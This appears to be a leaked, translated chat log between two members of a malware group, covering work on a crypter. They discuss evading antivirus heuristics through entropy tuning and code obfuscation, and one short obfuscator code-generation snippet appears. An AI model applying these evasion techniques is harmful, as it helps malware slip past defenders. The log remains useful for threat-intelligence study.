[19.01.22 12:29:52] elroy: This is something easier
[19.01.22 12:30:38] elroy: From simple - firewall and settings by mac address, who can, who can't.
[19.01.22 12:30:45] elroy: Virtual machine is allowed, host is not
[19.01.22 12:31:34] elroy: This is a big topic... I'll probably make general recommendations for all, but later
[24.01.22 11:59:25] basil: Greetings
[24.01.22 12:01:54] elroy: Listening
[24.01.22 12:02:13] elroy: Hello
[24.01.22 12:03:04] basil: I'm a bit free from spymbot right now. There's no way to set up a test environment with VMs. Do you need me on crypto?
[24.01.22 12:03:24] basil: I'm free now.
[24.01.22 12:04:37] elroy: You'll need me))
[24.01.22 12:04:47] elroy: Ping Orval, he's working on crypto right now.
[24.01.22 12:04:58] elroy: I also gave him crypter2 today
[24.01.22 12:06:52] basil: You did? All right. I'll write it, of course. Did you quit the crypto himself? For a promotion?
[24.01.22 12:09:38] elroy: Temporarily subbing Silver for the other projects, I'll tighten it up so nothing gets lost
[24.01.22 12:09:54] elroy: I'll keep an eye on crypto
[24.01.22 12:11:13] basil: ok.
[24.01.22 12:11:15] basil: ok
[24.01.22 16:19:05] basil: test
[24.01.22 16:19:54] elroy: You're going to fix crypter, you should fix random number generator, which is softwar. The one that works when the Intel hardware one doesn't work
[24.01.22 16:20:39] elroy: You should fix it, because it has a periodicity
[24.01.22 16:21:33] elroy: if you generate number (dword) suborders, their last bytes repeat
[24.01.22 16:22:06] elroy: With a periodicity of either 8 or close to 8
[24.01.22 16:22:17] elroy: Diego noticed
[24.01.22 16:22:21] elroy: What an eyeball...
[24.01.22 16:22:31] basil: got it
[24.01.22 16:22:49] basil: I've had stupid mistakes all day
[24.01.22 16:22:59] basil: Already covered with sweat from anger
[24.01.22 16:23:10] elroy: What kind of mistakes?
[24.01.22 16:23:46] basil: well, for example I'm making a test file for crypto in the path C:\test\test.exe
[24.01.22 16:23:56] basil: Running the crypter
[24.01.22 16:24:29] basil: Says there's no such file. Checked it - it's there. Maybe I wrote the path wrong no - everything is correct.
[24.01.22 16:25:07] basil: Then I accidentally renamed it to just test
[24.01.22 16:25:22] basil: It's highlighted as exe anyway
[24.01.22 16:25:52] basil: Then I realized I left the option to hide file extensions unchecked
[24.01.22 16:26:08] basil: and in fact the path was C:\test\test.exe.exe
[24.01.22 16:26:18] basil: That's why he couldn't open it
[24.01.22 16:26:34] basil: I got steam from my ears with anger
[24.01.22 16:27:40] elroy: You got off easy. And renamed the file to .ex_, and in the script, just the same renamed, but hesitated and ran it through the script ...
[24.01.22 16:28:14] basil: thanks to that.....
[24.01.22 16:28:28] basil: monday is a bad day for sure
[24.01.22 16:29:02] elroy: Yeah, I felt it myself.
[24.01.22 16:29:48] basil: You're rising through the ranks. Deputy Chief. Congratulations!
Really, without any jokes.
[24.01.22 16:45:28] elroy: Thanks for the congratulations. It's not really all that bright. I would have preferred from 8 to 17 with a break just to write code, like I used to. It was carefree and good)
[24.01.22 16:48:00] elroy: I remember a long time ago, when Silver hired me and gave me a ToR, I even agreed with him not to work from 8 to 17, but from 9 to 18, Moscow time.
[24.01.22 16:48:25] elroy: And then just over time so slightly shifted to 10 to 18 )))
[24.01.22 16:53:12] elroy: happens
[24.01.22 16:53:34] elroy: hmm
[24.01.22 16:53:41] elroy: still no apr
[24.01.22 17:18:54] elroy: test
[24.01.22 17:18:57] basil: test
[24.01.22 17:19:05] elroy: )))
[24.01.22 17:19:05] basil: yes. here
[24.01.22 17:25:07] elroy: all messages reached from me, those without apr?
[24.01.22 17:25:18] elroy: I wrote there about time
[24.01.22 17:25:31] basil: Yes.
[24.01.22 17:25:41] basil: there were these messages
[24.01.22 17:25:56] basil: maybe I just used an old browser
[24.01.22 17:26:31] elroy: old one is stable
[24.01.22 17:26:39] elroy: The new one was down 11
[24.01.22 17:26:51] elroy: But it was stable
[24.01.22 17:26:59] basil: )))
[24.01.22 17:27:06] basil: Was falling steadily
[24.01.22 17:27:08] basil: )))
[24.01.22 17:27:25] basil: You have a good sense of humor, all the same
[24.01.22 17:27:58] elroy: Yes)
[24.01.22 17:28:47] basil: Look, I've been trying to get rid of detects all day. Writes mostly in HEUR detects.
[24.01.22 17:28:55] basil: this is an entropy detector
[24.01.22 17:29:03] basil: right?
[24.01.22 17:30:30] elroy: not only by it
[24.01.22 17:30:48] elroy: This is a heuristic. I.e. any suspicious signs.
[24.01.22 17:31:17] elroy: It's something he can't say for sure, but it has some similarity between what he has in his signatures
[24.01.22 17:31:35] basil: well usually all this heuristics somehow came down to entropy.
[24.01.22 17:31:56] elroy: But you set up entropy, right?
[24.01.22 17:32:06] basil: yes
[24.01.22 17:32:09] elroy: Doesn't help?
[24.01.22 17:32:12] basil: of course
[24.01.22 17:32:15] basil: it helps
[24.01.22 17:32:17] elroy: So not entropy
[24.01.22 17:32:23] elroy: (sorry for the obviousness)
[24.01.22 17:32:46] elroy: Ah, so it helps
[24.01.22 17:32:51] elroy: So it's good)))
[24.01.22 17:32:55] elroy: That's great
[24.01.22 17:32:59] elroy: So it's a good crypto
[24.01.22 17:33:33] basil: there's nod32 detection
[24.01.22 17:33:41] basil: it's not entropy
[24.01.22 17:33:54] basil: but it's kind of strange appearing and disappearing
[24.01.22 17:34:22] basil: some of detects with word heur were removed exactly by entropy correction
[24.01.22 17:34:29] elroy: If you look at the dincheck, it's the dincheck that glitches. It doesn't appear and disappear, it's there steadily.
[24.01.22 17:34:49] elroy: It's not even dincheck
[24.01.22 17:34:52] elroy: *dincek
[24.01.22 17:35:02] elroy: I checked one file on me and on dincheck
[24.01.22 17:35:16] elroy: I got a stable catch, I have no detection, on dincheck, and vice versa
[24.01.22 17:35:29] elroy: Then I caught that on one machine it is stable, and on another one it is not
[24.01.22 17:35:37] elroy: This is their antivirus glitch.)
[24.01.22 17:35:43] elroy: No way without bugs
[24.01.22 17:36:29] elroy: But it means it's there, just Nod misses it
[24.01.22 17:37:21] basil: https://dyncheck.com/scan/id/72f583a7aff0eb358d1c117c6b545c39
[24.01.22 17:37:57] basil: https://dyncheck.com/scan/id/d3183f4945e0a9d51cef2001be4f1c09
[24.01.22 17:38:28] basil: these are with different entropies
[24.01.22 17:38:57] basil: never mind. now let's try to clean nod first
[24.01.22 17:40:41] elroy: nod may have a detector on code obfuscation, and specifically on that mechanism, where two variables are randomly specified
[24.01.22 17:43:00] elroy: I'll send you the code, it's an updated noiser, I haven't yet had time to integrate into the crypto itself
[24.01.22 17:43:11] elroy: I just need to transfer
[24.01.22 17:43:15] elroy: There's a new algorithm
[24.01.22 17:43:54] elroy: Or did
[24.01.22 17:44:12] elroy: Look in the code, there is condiGen in ReadyCodeObfuscator
[24.01.22 17:45:28] basil: no. the "condiGen" line was not found
[24.01.22 17:45:39] elroy: I'll send you a copy.
[24.01.22 17:48:47] elroy: ``
https://file.io/GSWyyMkFMzHz
```
[24.01.22 17:51:40] basil: I will add it now. Let's try
[24.01.22 18:13:31] basil: well at least nod32 is gone
[24.01.22 18:13:32] basil: gone stable
[24.01.22 18:13:43] basil: got to pick up entropy somehow
[24.01.22 18:13:48] basil: it's about entropy
[24.01.22 18:14:05] elroy: fine)
[24.01.22 18:14:57] basil: data section is definitely very low 2u6
[24.01.22 18:14:59] basil: 2.6
[24.01.22 18:15:01] elroy: there entropy should just be normal and not exceed 7, usually from 5.0 to 6.5, maybe there is a size dependence...
[24.01.22 18:15:17] elroy: on rdate
[24.01.22 18:24:14] basil: https://dyncheck.com/scan/id/e03ca1223321343e5251e2483492ce2d
[24.01.22 18:24:19] basil: almost there
[24.01.22 18:24:39] basil: and it's all "entropy game"
[24.01.22 18:27:17] basil: even better
[24.01.22 18:27:18] basil: https://dyncheck.com/scan/id/5db62305a372c821bf6457671738badc
[24.01.22 19:00:21] basil: well, in my opinion, this is entropy. But so far I haven't managed to find the right values
[26.01.22 14:11:35] elroy: hello
[26.01.22 14:12:06] elroy: Tell me, are you busy now with cryptor or spambot?
[26.01.22 14:12:33] basil: now I'm in crypto
[26.01.22 14:12:41] basil: jefferson is silent
[26.01.22 14:12:50] elroy: I see
[26.01.22 14:13:21] basil: slow of course
[26.01.22 14:14:01] basil: I don't know with one level of entropy the detector is at one av with another it disappears
[26.01.22 14:14:06] basil: Appears at another av
[26.01.22 14:14:33] basil: I split crypt into blocks.
[26.01.22 14:14:38] elroy: dll or ede ?
[26.01.22 14:14:46] basil: exe
[26.01.22 14:15:15] basil: there where files are clean
[26.01.22 14:15:17] basil: heap
[26.01.22 14:15:36] basil: I can't find a particular detector location
[26.01.22 14:15:39] elroy: there is no wrapper for exe in stub, algorithms to run exe are not wrapped. Maybe you should wrap it.)
[26.01.22 14:16:04] basil: now the moment
[26.01.22 14:32:19] basil: test
[26.01.22 15:03:34] elroy: apr?
[26.01.22 15:04:30] basil: there's something wrong with the cryptor. Okay, what kind of dll said.
[26.01.22 15:04:39] basil: dll is clean
[26.01.22 15:04:51] basil: I mean if we do it in dll form
[26.01.22 15:05:27] elroy: There's no deployment algorithm wrapped by noiser code for exe. There's a different code for exe, but for dll it is wrapped
[26.01.22 15:05:31] elroy: Wrapped
[26.01.22 15:05:59] elroy: You just need to put the obfuscator comments correctly... Test.
[26.01.22 15:07:21] basil: I think everything is wrapped there. At least UniCripterProj.cpp.build
[26.01.22 15:07:29] basil: there is an obfuscation
[26.01.22 15:07:48] elroy: Yes.
[26.01.22 15:07:51] elroy: But look at the source
[26.01.22 15:08:02] elroy: There is no obfuscation for exe
[26.01.22 15:09:03] elroy: Find for example the function PeLdrApplyImageRelocations
[26.01.22 15:09:07] elroy: It is not wrapped
[26.01.22 15:09:33] elroy: PeLdrRelocateAndContinue
[26.01.22 15:09:52] elroy: It's all the loader exe
[26.01.22 15:11:49] elroy: There's a peculiarity of that loader in that it moves itself. and in its place puts sections of the payload. So there's a peculiarity of code execution there when it's self relocating. I have not tested it with noise noiser, I do not know how the code execution in the case of self-move, whether it will fall...
[26.01.22 15:11:56] elroy: This should be tested.
[26.01.22 15:12:48] basil: ok. let's try it
[26.01.22 15:47:44] basil: are there any error handlers implemented in the final binary?
[26.01.22 16:04:46] elroy: there are no error handlers
[26.01.22 16:04:52] elroy: Or I don't understand the question...
[26.01.22 16:05:06] basil: I got your question right
[26.01.22 16:05:39] basil: okay. let's see how cri peter behaves under debugging
[26.01.22 16:15:29] elroy: exe under debugging it won't deploy correctly
[26.01.22 16:15:45] elroy: I told you, it deploys itself
[26.01.22 16:15:52] basil: I understand
[26.01.22 16:15:59] basil: remember
[26.01.22 16:16:16] elroy: there you can fix the logging system
[26.01.22 16:16:27] elroy: You can see from the log what went where
[26.01.22 16:16:58] basil: one more question. This code I threw off. Was it tested?
[26.01.22 16:17:46] elroy: Let's say I tested it. It worked. But I didn't run it under load. I.e. I didn't make heterogeneous tests.
[26.01.22 16:18:31] elroy: Just crypted it, it worked. Crypted - used crypter 8, there's noizer itself used for obfuscation
[26.01.22 16:20:22] basil: well, it's like that every other time. Okay. let's see what happens.
[26.01.22 16:20:22] basil: test
[26.01.22 16:20:48] elroy: Of course, take a look... May be through and through, then debug it)
[26.01.22 16:21:42] basil: there's sometimes cryper hangs in processes. Eats up 70% of cpu. But the result of his work is not
[26.01.22 16:22:40] elroy: You build with studio 2022
[26.01.22 16:22:41] elroy: ?
[26.01.22 16:22:57] basil: yes
[26.01.22 16:23:45] elroy: I had this. Could not catch. But it is not associated with update, such a gap and before was observed.
[26.01.22 16:24:14] elroy: Such looping can be in obfuscator code in case if we do not go by correct wordlist
[26.01.22 16:24:21] elroy: That is control to dead code
[26.01.22 16:24:28] elroy: And this is very easy to check
[26.01.22 16:24:49] elroy: You just need to add MessgeBox in code generator where dead word...
[26.01.22 16:24:53] elroy: I did it that way
[26.01.22 16:25:00] elroy: Control doesn't get there"
[26.01.22 16:25:25] elroy: I guess it's a bug in studio 2022, it collects some crap
[26.01.22 16:25:59] basil: ok.
[02.02.22 08:41:38] elroy: hello
[02.02.22 08:41:59] basil: test
[02.02.22 08:42:11] elroy: test
[02.02.22 08:42:12] basil: test
[02.02.22 08:42:17] basil: greetings
[02.02.22 08:42:28] elroy: jefferson was looking for you
[02.02.22 08:42:48] basil: we already talked. It's all right.
[02.02.22 08:43:58] basil: I was very sick. Frances knew about it, I hardly wrote him. Then he was in the hospital. There was no connection. That's why he was unavailable.
[02.02.22 08:44:11] basil: I couldn't write you back
[02.02.22 08:44:17] elroy: Kovid?
[02.02.22 08:45:02] basil: It's a weird situation there. A quarter of the hospital's got acute respiratory viral infections (based on symptoms). Tests were negative.
[02.02.22 08:45:57] basil: You have to be in an inpatient department to get a serious prescription. As soon as you feel better, you have to go home. There are not enough beds, and the wards are full.
[02.02.22 08:46:27] basil: Generally, it spreads very quickly
[02.02.22 08:46:48] basil: Be very careful not to get in trouble.
[02.02.22 08:48:21] basil: I was lucky, I got the shot. And if I hadn't done it, I would have had a week more.
[02.02.22 08:48:30] basil: if everything goes well
[02.02.22 12:22:41] elroy: test
[02.02.22 12:23:11] basil: test
[02.02.22 12:23:48] basil: wrote?
[02.02.22 12:24:27] elroy: yes
[02.02.22 12:24:55] basil: there was sound, no text
[02.02.22 12:25:00] basil: repeat
[02.02.22 12:27:52] elroy: Repeat the messages you wrote, last 6
[02.02.22 12:28:00] elroy: My browser crashed at that time
[02.02.22 12:28:38] basil: )))
[02.02.22 12:29:44] basil: yes actually messages were with warnings. Shave off - the rate of disease in hospitals is growing very quickly.
[02.02.22 12:30:19] basil: and a full "ashlar"
[02.02.22 12:30:59] elroy: I thought something new)
[02.03.22 08:05:26] elroy: it works
[02.03.22 08:05:49] basil: Yes. Only I have the button went somewhere else.
[03.02.22 08:06:04] elroy: Refresh page
[03.02.22 08:06:16] basil: a moment
[02/03/222 08:06:53] basil: yes. ok. thank you.
[04.02.22 15:44:16] basil: test
[04.02.22 15:45:53] elroy: apt?
[04.02.22 15:46:02] basil: yes
[04.02.22 15:46:06] basil: test
[04.02.22 15:46:08] basil: great
[04.02.22 15:46:20] basil: there's a little question about crypto
[04.02.22 15:46:38] basil: there's a piece of code that does code generation
[04.02.22 15:46:57] basil: ``
		string lmbd = "auto lmbd = [=]()->int { static bool isInit = false; if (!isInit) { isInit = true; "
			+ condiGen.GetInitFunctionCall() + "} return " + to_string(randGen.GetRandom(32767-1024)+1024) + "; };"
		string head = lmbd + "\r\n" + label1 + ":\r\n" + codeGenHead;
```
[04.02.22 15:47:54] basil: Is there any way to explain why this particular range was chosen
```
to_string(randGen.GetRandom(32767-1024)+1024)
```
[04.02.22 15:47:59] basil: ?
[04.02.22 15:48:28] basil: there is a loop at the end of the goto subroutine
[04.02.22 15:52:25] elroy: looping is not provided. I don't remember exactly what I was starting from, but the value should be greater than 1024 and 32768.
Here 32768 is 65535 / 2 - i.e. it's two bytes, it's type WORD, which can be signed and unsigned, and not to mess with its signed part, used its half, so that exactly unsigned, and -1024 - to fit in +24.
There's word variable type in random conditions, I remember, which means that if you get used to it, the word that's assigned there will get cut off, the code will go the wrong way
[04.02.22 15:54:46] basil: a question. What if it goes like this
```
auto lmbd = [=]()->int { static bool isInit = false; if (!isInit) { isInit = true; InitFunction_CondiVars_ftJupzeBwyaRiXqD();} return 9733; };
qbnhkFVItrbOINGBoX:
char hImxYQSF=(char)lmbd();
```
[04.02.22 15:55:12] basil: char can be negative under certain conditions
[04.02.22 15:55:47] elroy: That's exactly what I was writing about.
Yes, you don't know exactly what's left of 9733, but it can also be negative
[04.02.22 15:56:14] elroy: That's why the minimum dimension there should be word signed
[04.02.22 15:56:16] basil: ok. got it.
[04.02.22 15:56:20] basil: I guess...
[04.02.22 15:57:27] elroy: there int16_t is minimal type
[04.02.22 15:58:14] elroy: Theoretically everything is correct, it shouldn't loop) Check what values lead to the loop with the debugger.
[04.02.22 15:58:44] elroy: And I looked there through MessageBox, it didn't get into dead conditions
[04.02.22 15:58:54] elroy: Maybe the optimizer made a mistake somewhere
[04.02.22 15:59:03] basil: yes. i see a loop
[04.02.22 15:59:15] basil: when debugging
[10.02.22 12:26:55] elroy: hello
[10.02.22 12:27:00] basil: hello
[10.02.22 12:27:09] elroy: What project are you working on now?
[10.02.22 12:27:10] basil: about diego?
[10.02.22 12:27:18] elroy: And about him)
[10.02.22 12:27:26] basil: now on spam bot
[10.02.22 12:27:47] basil: with diego now sending him noiser
[10.02.22 12:40:16] basil: there is a question. Here diego wrote, that in noiser should be some "sixth digit". I do not quite understand what it means?
[10.02.22 13:01:03] elroy: code-complexity
[10.02.22 13:01:04] elroy: There are 5 digits, the sixth digit is a nesting if condition
[10.02.22 13:01:30] basil: ok.
[10.02.22 14:14:33] basil: found. diego passed
[21.02.22 13:33:16] basil: welcome
[21.02.22 13:33:27] elroy: greetings
[21.02.22 13:33:37] basil: Too bad. It was an interesting experience. I haven't had such an experience yet.
[21.02.22 13:33:53] elroy: Let me finish it.)
[21.02.22 13:41:48] basil: test
[21.02.22 13:42:03] elroy: Yeah.
That's what I expected.
Send him the contacts, maybe he'll reboot.
[21.02.22 13:42:33] basil: let's try. Although, as the saying goes, "fresh food, but it's hard to get it."
[21.02.22 13:42:51] basil: But try as you may
[21.02.22 13:43:36] basil: Whoever you are, I want to thank you. You taught me a lot.
[21.02.22 13:44:07] elroy: I'm sure we'll meet again.
[21.02.22 13:44:14] basil: you think so?
[21.02.22 13:44:17] elroy: Although who knows?
[21.02.22 13:44:22] elroy: And thank you for your work.)
[21.02.22 13:44:57] elroy: I think so. You'll meet another comrade, who will meticulously load something, as I do ))
[21.02.22 13:45:13] basil: it's you who's a loader)))
[21.02.22 13:45:16] basil: come on)))
[21.02.22 13:45:26] basil: if they taught me that at school)))
[21.02.22 13:45:28] basil: like you
[21.02.22 13:45:29] elroy: I could really use a rest... I'm really tired, I haven't rested once from vacation.
[21.02.22 13:45:45] basil: I'm kind of at my limit too.
[21.02.22 13:45:58] basil: Plus all this business at the border
[21.02.22 13:46:09] elroy: Are you from the DPR?
[21.02.22 13:46:47] elroy: Or from the FSS?
[21.02.22 13:46:57] basil: I will not say where from (you understand) But I have very serious information that there are no exercises at the border
[21.02.22 13:47:07] basil: An acquaintance lives there
[21.02.22 13:47:26] basil: He says there are so many machines going by at night
[21.02.22 13:47:35] elroy: Tremendous
[21.02.22 13:47:59] basil: aren't there exercises going on at night?
[21.02.22 13:48:26] basil: for the drill
[21.02.22 13:49:47] elroy: If I had known... I used to have a misunderstanding as a child how it was possible to spend so much money on exercises, planes, tanks, fuel...
[21.02.22 13:53:43] basil: I think the ravil situation frightened me. As for me, they took the lower ranks.
[21.02.22 13:55:10] basil: Biden Putin spoke there. The Russians decided to bend over and take who they could.
[21.02.22 13:55:18] basil: And it scared a lot of people.
[21.02.22 13:55:45] elroy: Note that the Revs were not charged with developing malware, but with illegal fundraising, that's all. So they didn't find anything, which means that the guys were doing a good job. They were just turned in...
[21.02.22 13:56:03] basil: Yes, yes, yes, I noticed that too.
[21.02.22 13:56:11] basil: The lower ranks were taken
[21.02.22 13:56:26] basil: Those who took money
[21.02.22 13:56:28] elroy: Let's hope so
[21.02.22 13:56:58] elroy: I hope our leadership comes to its senses
[21.02.22 13:57:38] basil: Hopefully....
[21.02.22 13:57:49] basil: I really hope
[21.02.22 13:58:28] basil: I think they got to them somehow through the bank system (or somebody turned them in)
[21.02.22 13:59:05] basil: VVP talked to Biden. Vova decided to make a goodwill gesture - to show how they fight
[21.02.22 13:59:30] basil: And Amerian comrade decided - that it should be like this
[21.02.22 13:59:57] basil: i.e. "well done" go on
[21.02.22 14:00:39] basil: Now nothing will fall off for these comrades from across the ocean
[21.02.22 14:00:48] basil: Somehow it seems so to me
[21.02.22 14:03:47] elroy: They will get a new version of cryptographer))
[21.02.22 14:03:57] basil: )))))
[21.02.22 14:04:18] basil: My glasses fell out from laughter. You know how to joke)))
[21.02.22 14:04:40] elroy: Fresh)
[21.02.22 14:04:59] basil: Okay. I'd like to exchange contacts.
[21.02.22 14:05:14] basil: you use qTox?
[21.02.22 14:05:36] elroy: Log toad on thesecure.biz, just from the psi and send it to me and Franz
[21.02.22 14:06:02] basil: ok.
[21.02.22 14:22:41] basil: test
[21.02.22 14:22:49] basil: gert52458@thesecure.biz
[21.02.22 14:23:13] basil: what if it works and we win
[21.02.22 14:23:15] basil: ))
[21.02.22 14:23:22] basil: Let's hope for the best
[21.02.22 14:26:18] basil: Can I have yours written down somehow?
[21.02.22 14:28:47] elroy: I'll add it later. The other day. Don't get lost from there.
[21.02.22 14:29:20] basil: Whatever you say. Don't leave me, chief. There's nowhere to go.
[21.02.22 14:29:22] basil: ((.
[21.02.22 14:29:44] elroy: Aren't you working?
[21.02.22 14:30:44] basil: There's 0.25 kopecks left. But it's hard to quit the official job right now. There's a reservation "for the war."
[21.02.22 14:30:48] basil: You understand
[21.02.22 14:30:57] elroy: ))
[21.02.22 14:30:57] basil: 0.25
[21.02.22 14:31:23] basil: Not complicated, more like dangerous
[21.02.22 14:31:49] elroy: reservation "for war", you mean to take the best places before mobilization starts?
I just heard the idea that world war 3 is coming...
[21.02.22 14:32:34] basil: No, it's the other way around, not taken
[21.02.22 14:32:56] basil: So if hostilities start, you stay put
[21.02.22 14:33:05] basil: That's good. Too bad it's pennies.
[21.02.22 14:33:56] basil: But guys have a lot of money
[21.02.22 14:34:16] basil: practically for 5 million rubles - to bend the Internet
[21.02.22 14:34:43] elroy: I used to reason with a comrade that you can't score on service... After all, if you just don't show up at the enlistment office, the war won't pass by, the only question is where we'll end up, in a barracks with rations or in a tent near a broken home.....
[21.02.22 14:35:22] elroy: *my world
[21.02.22 14:35:33] basil: Yes.
[21.02.22 14:35:38] basil: unfortunately
